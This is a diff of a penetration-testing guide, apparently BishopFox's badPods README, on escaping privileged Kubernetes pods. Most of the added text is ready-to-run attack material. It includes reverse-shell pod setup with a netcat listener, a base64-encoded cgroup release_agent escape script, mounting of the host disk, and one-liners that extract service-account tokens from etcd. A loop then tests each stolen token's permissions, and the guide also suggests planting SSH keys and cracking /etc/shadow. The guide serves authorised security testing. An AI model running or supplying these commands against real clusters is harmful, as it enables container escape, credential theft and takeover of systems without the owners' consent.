@@ -1,45 +1,218 @@
 # Bad Pod #3: Privileged
 
 If you only have `privileged: true`, there are two paths you can take: 
-* **Mount the host’s filesystem** – You can mount the host’s filesystem into your pod using the mount command, which gives you roughly the same level of access as the next example, Bad Pod #4: hostPath.  
-*	**Exploit cgroup usermode helper programs** – If that is not enough access to accomplish your goals, you can get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC `undock.sh` to execute one command a time, or you can use Brandon Edwards and Nick Freeman’s version  from their talk A Compendium of Container Escapes, which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module docker privileged container escape which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
+* **Exploit cgroup usermode helper programs** – Your best bet is to get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC `undock.sh` to execute one command a time, or you can use Brandon Edwards and Nick Freeman’s version  from their talk A Compendium of Container Escapes, which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module docker privileged container escape which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
 
-Whichever option you choose, the Kubernetes privilege escalation paths are the largely the same as the Bad Pod #1: Everything-allowed. 
+Once you get an interactive shell, the Kubernetes privilege escalation paths are the largely the same as the [Bad Pod #2: Everything-allowed](../priv-and-hostpid/README.md). 
 
+* **Mount the host’s filesystem** – You can also skip the RCE path and mount the host’s filesystem into your pod using the mount command. In my experience, this gives you a limited view of the filesystem. Some files, and therefore privesc paths, are not accessible from your privileged pod unless you escalate to a full shell on the node. 
 
-# Pod Creation
-## Create a pod you can exec into
-Create pod
+## Table of Contents 
+- [Pod creation & access](#pod-creation--access)
+  - [Exec pods](#exec-pods)
+  - [Reverse shell pods](#reverse-shell-pods)
+  - [Deleting resources](#deleting-resources)
+- [Post exploitation](#post-exploitation)  
+  - [Remote code execution](#remote-code-execution)
+    - [Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access](#option-1-use-felix-wilhelms-undocksh-and-hunt-around-with-non-interactive-access)
+    - [Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell](#option-2-use-brandon-edwards-and-nick-freemans-version-which-upgrades-you-to-an-interactive-shell)
+    - [Option 3: Use the metasploit module: docker_privileged_container_escape](#option-3-use-the-metasploit-module-docker_privileged_container_escape)
+    - [Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell](#option-4-use-undocksh-to-download-your-own-payload-and-then-execute-it-spawn-the-reverse-shell)
+  - [Mount the host's filesystem](#mount-the-hosts-filesystem)
+    - [Can you run your pod on a control-plane node](#can-you-run-your-pod-on-a-control-plane-node)
+      - [Read secrets from etcd](#read-secrets-from-etcd)
+    - [Look for kubeconfigs in the host filesystem](#look-for-kubeconfigs-in-the-host-filesystem)
+    - [Grab all tokens from all pods on the system](#grab-all-tokens-from-all-pods-on-the-system)
+  - [What to look for on a node](#what-to-look-for-on-a-node)
+  - [Some other ideas](#some-other-ideas)
+  - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
+- [Demonstrate impact](#demonstrate-impact)
+- [References and further reading:](#references-and-further-reading)
+- 
+# Pod creation & access
+
+## Exec pods
+Create one or more of these resource types and exec into the pod
+
+**Pod**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml 
-```
-Exec into pod 
-```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
 kubectl exec -it priv-exec-pod -- bash
 ```
+**Job**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/job/priv-exec-job.yaml 
+kubectl get pods | grep priv-exec-job      
+kubectl exec -it priv-exec-job-[ID] -- bash
+```
+**CronJob**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/cronjob/priv-exec-cronjob.yaml 
+kubectl get pods | grep priv-exec-cronjob      
+kubectl exec -it priv-exec-cronjob-ID -- bash
+```
+**Deployment**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/deployment/priv-exec-deployment.yaml 
+kubectl get pods | grep priv-exec-deployment        
+kubectl exec -it priv-exec-deployment-[ID] -- bash
+```
+**StatefulSet (This manifest also creates a service)**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/statefulset/priv-exec-statefulset.yaml
+kubectl get pods | grep priv-exec-statefulset
+kubectl exec -it priv-exec-statefulset-[ID] -- bash
+```
+**ReplicaSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/replicaset/priv-exec-replicaset.yaml
+kubectl get pods | grep priv-exec-replicaset
+kubectl exec -it priv-exec-replicaset-[ID] -- bash
 
-## Reverse shell pod
+```
+**ReplicationController**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/replicationcontroller/priv-exec-replicationcontroller.yaml
+kubectl get pods | grep priv-exec-replicationcontroller
+kubectl exec -it priv-exec-replicationcontroller-[ID] -- bash
+```
+**DaemonSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/daemonset/priv-exec-daemonset.yaml 
+kubectl get pods | grep priv-exec-daemonset
+kubectl exec -it priv-exec-daemonset-[ID] -- bash
+```
 
-Set up listener
+## Reverse shell pods
+Create one or more of these resources and catch reverse shell
+
+**Generic resource type creation example***
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+
+**Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-Create pod from local manifest without modifying it by using env variables and envsubst
+**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/priv/[RESOURCE_TYPE]/priv-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
 
-Catch the shell
+**Step 3: Catch the shell**
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
 
+## Deleting resources
+You can delete a resource using it's manifest, or by name. Here are some examples: 
+```
+kubectl delete [type] [resource-name]
+kubectl delete -f manifests/priv/pod/priv-exec-pod.yaml
+kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
+kubectl delete pod priv-exec-pod
+kubectl delete cronjob priv-exec-cronjob
+```
 # Post exploitation
 
-## Mount the host's filesystem
+### Can you run your pod on a control-plane node
+*This is not a possible on cloud managed Kubernetes clusters like GKE and EKS - they hide the control-plane.*
+
+The pod you created above was likely scheduled on a worker node. Before jumping into post exploitation on the worker node, it is worth seeing if you run your a pod on a control-plane node. If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
+
+Get nodes
+```
+kubectl get nodes
+NAME                STATUS   ROLES    AGE   VERSION
+k8s-control-plane   Ready    master   93d   v1.19.1
+k8s-worker          Ready    <none>   93d   v1.19.1
+```
+
+Pick your manifest, uncomment and update the nodeName field with the name of the master node
+```
+nodeName: k8s-control-plane
+```
+Create your pod
+```
+kubectl apply -f manifests/priv/job/priv-exec-job.yaml
+```
+
+## Option 1: Mount the host's filesystem
+Some of the privesc paths are not available if you mount the node's filesystem in this way. That said, it is easy enough to do that you might as well mount the device and see what you can see. 
+
+**First, check out the storage devices attached to the host:** 
+*This example is run on a GKE cluster*
+```
+kubectl exec -it priv-exec-pod -- fdisk -l
+Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors
+Disk model: PersistentDisk
+...omitted for brevity...
+
+Device       Start       End   Sectors  Size Type
+/dev/sda1  8704000 209715166 201011167 95.9G Linux filesystem
+/dev/sda2    20480     53247     32768   16M ChromeOS kernel
+/dev/sda3  4509696   8703999   4194304    2G ChromeOS root fs
+...omitted for brevity...
+```
+
+**Make a mount point and mount the host's storage device into the pod**
+```
+kubectl exec -it priv-exec-pod -- mkdir /host
+kubectl exec -it priv-exec-pod -- bash -c "mount /dev/sda1 /host/"
+```
+
+You are now ready to exec into your pod and see what's in `/host/`.
+
+#### Read secrets from etcd
+If you can run your pod on a control-plane node using the `nodeName` selector in the pod spec, you might have easy access to the `etcd` database, which contains all of the configuration for the cluster, including all secrets. 
+
+Below is a quick and dirty way to grab secrets from `etcd` if it is running on the control-plane node you are on. If you want a more elegant solution that spins up a pod with the `etcd` client utility `etcdctl` and uses the control-plane node's credentials to connect to etcd wherever it is running, check out [this example manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) from @mauilion. 
+
+**Check to see if `etcd` is running on the control-plane node and see where the database is (This is on a `kubeadm` created cluster)**
+```
+root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
+```
+Output:
+```
+data-dir=/var/lib/etcd
+```
+**View the data in etcd database:**
+```
+strings /var/lib/etcd/member/snap/db | less
+```
+
+**Extract the tokens from the database and show the service account name**
+```
+db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
+```
+
+**Same command, but some greps to only return the default token in the kube-system namespace**
+```
+db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
+```
+Output:
+```
+1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
+```
+
+### Look for kubeconfigs in the host filesystem 
+
+By default, nodes don't have `kubectl` installed. If you are lucky though, an administrator tried to make their life (and yours) a little easier by installing `kubectl` and their highly privileged credentials on the node. We're not so lucky on this GKE node 
+
+**Some ideas:**
+```bash
+find /host -name kubeconfig
+find /host -name .kube
+grep -R "current-context" /host/home/
+grep -R "current-context" /host/root/
+grep -R "current-context" /host/
+```
+
+### Grab all tokens from all pods on the system
+
+In my experience, the tokens mounted in each pod are not accessible if you simply mount the filesystem as described in this section. However, if you get yourself an interactive shell as outlined in the next section, this privesc path is once again available to you. 
 
 
 ## Remote code execution
@@ -201,91 +374,100 @@ hostname
 k8s-worker
 ```
 
-## What to look for on a node
 
-### Look for kubeconfig's in the host filesystem 
-If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
+### Grab all tokens from all pods on the system
 
-```bash
-find / -name kubeconfig
-/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
-/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
-/var/lib/node-problem-detector/kubeconfig
-/var/lib/kubelet/kubeconfig
-/var/lib/kube-proxy/kubeconfig
-/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
-/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
-/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
-/mnt/stateful_partition/var/lib/kubelet/kubeconfig
-/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
+You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. 
+
+Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:
+
+**If you haven't already, drop the undock.sh script into on your pod.** 
+The file will be at /undock.sh: 
 ```
-### Find all tokens from all pods and see what permissions they have assigned to them
-Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system
-
-#### Grab all tokens from all pods on the system
-This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
-```bash
-tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
+kubectl exec -it priv-exec-pod -- bash -c "echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > /undock.sh" 
 ```
 
-```
-default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
-default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
-development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
-kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
-```
-
-#### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
-```bash
-cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
-```
-```
-eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]
-```
-
-#### System where you have kubectl installed:
-```bash
-DTOKEN=`echo eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]`
-kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
-kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
-```
-
-Does the token allow you to view secrets in that namespace? How about other namespaces?
-Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
+This is needed to make the next examples work from outside the pod using `kubectl exec`.
 
 
-For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
-```bash
-DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
-kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
-kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
+**Run kubectl can-i --list against ALL tokens found on the node**
+
+Run this where you have kubectl installed, and NOT from within the priv pod. 
+
+This is what the following command does:
+* From outside the pod, you execute `kubectl exec`, and use undock.sh to find all of the token locations on the host
+* You then iterate through the list of filenames, and
+  * Print the token location
+  * Run `kubectl auth can-i list` using each token via the `--token` command line argument.  
+
+
 ```
-Does the token allow you to view secrets in that namespace? How about other namespaces?
-Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
+tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
+for filename in $tokens; \
+do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
+echo "Token Location: $filename_clean"; \
+tokena=`kubectl exec -it priv-exec-pod -- sh undock.sh "cat $filename_clean"`; \
+echo -n "What can I do? "; \
+kubectl --token=$tokena auth can-i --list; echo; echo; echo; \
+done
+```
+
+This gives you a list of the actions each token can perform cluster wide. 
+The next command will do the same thing, but just in the kube-system namespace.
 
 
-#### Some other ideas:
+**Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
+```
+tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
+for filename in $tokens; \
+do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
+echo "Token Location: $filename_clean"; \
+tokena=`kubectl exec -it priv-exec-pod -- sh undock.sh "cat $filename_clean"`; \
+echo -n "What can I do? "; \
+kubectl --token=$tokena auth can-i --list -n kube-system; echo; echo; echo; \
+done
+```
+
+**Can any of the tokens:**
+* Create a pod, deployment, etc. in the kube-system namespace?
+* Create a role in the kube-system namespace?
+* View secrets in the kube-system namespace?
+* Create clusterrolebindings? 
+
+You are looking for a way to access to all resources in all namespaces.
+
+
+
+
+## Some other ideas
 * Add your public key authorized_keys on the node and ssh to it
 * Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
 
+## Attacks that apply to all pods, even without any special permissions
 
-#### Attacks that apply to all pods, even without any special permissions
-* Cloud metadata service
+**To see these in more detail, head over to [nothing-allowed/README.md](../nothing-allowed)** 
+
+* Access the cloud metadata service
 * `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
 * Kubernetes exploits
 * Hunting for vulnerable application/services in the cluster
 
 
-# Demonstrate Impact
+# Demonstrate impact
 
-If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.
+If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 
 
-
-# Reference(s): 
+   
+# References and further reading: 
 * https://twitter.com/_fel1x/status/1151487051986087936
 * https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
 * https://www.youtube.com/watch?v=BQlqita2D2s
 * https://www.rapid7.com/db/modules/exploit/linux/local/docker_privileged_container_escape/
+* [Secure Kubernetes - KubeCon NA 2019 CTF](https://securekubernetes.com/)
+* Command and KubeCTL: Real-World Kubernetes Security for Pentesters - [Talk](https://www.youtube.com/watch?v=cRbHILH4f0A) / [Blog](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)
+* Compromising Kubernetes Cluster by Exploiting RBAC Permissions - [Talk](https://www.youtube.com/watch?v=1LMo0CftVC4) / [Slides](https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf)
+* The Path Less Traveled: Abusing Kubernetes Defaults - [Talk](https://www.youtube.com/watch?v=HmoVSmTIOxM) / [Repository](https://github.com/mauilion/blackhat-2019)
+
+
+
